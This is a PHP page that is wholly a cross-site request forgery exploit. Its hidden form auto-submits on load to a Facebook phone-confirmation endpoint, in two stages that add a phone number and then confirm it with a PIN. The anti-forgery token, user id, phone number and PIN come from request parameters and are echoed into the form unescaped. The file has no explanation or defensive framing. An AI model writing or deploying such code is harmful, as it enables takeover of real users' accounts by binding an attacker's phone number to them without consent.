<html>
	<body>
		<form id="csrf" name="csrf" method="POST" action="https://www.facebook.com/ajax/phone/confirmation?source=sms_activation">
		
			<?php if($_REQUEST['state'] == '1') { ?>
			
				<input type="hidden" name="fb_dtsg" value="<?php echo $_REQUEST['fb_dtsg']; ?>"/>
				<input type="hidden" name="country" value="IT"/>
				<input type="hidden" name="contact_point" value="<?php echo $_REQUEST['mobile_number']; ?>"/>
				<input type="hidden" name="verification_type" value="code_sms"/>
				<input type="hidden" name="state" value="1"/>
				<input type="hidden" name="source" value="sms_activation"/>
				<input type="hidden" name="__user" value="<?php echo $_REQUEST['user']; ?>"/>
				<input type="hidden" name="__a" value="1"/>
				<input type="hidden" name="phstamp" value="<?php echo $_REQUEST['phstamp']; ?>"/>
				
			<?php } else { ?>
					
				<input type="hidden" name="fb_dtsg" value="<?php echo $_REQUEST['fb_dtsg']; ?>"/>
				<input type="hidden" name="pin" value="<?php echo $_REQUEST['pin']; ?>"/>
				<input type="hidden" name="state" value="2"/>
				<input type="hidden" name="country" value="IT"/>
				<input type="hidden" name="source" value="sms_activation"/>
				<input type="hidden" name="contact_point" value="<?php echo $_REQUEST['mobile_number']; ?>"/>
				<input type="hidden" name="verification_type" value="code_sms"/>			
				<input type="hidden" name="__user" value="<?php echo $_REQUEST['user']; ?>"/>
				<input type="hidden" name="__a" value="1"/>
				<input type="hidden" name="phstamp" value="<?php echo $_REQUEST['phstamp']; ?>"/>
			
			<?php } ?>
			
		</form>
		<script>document.csrf.submit();</script>
	</body>
</html>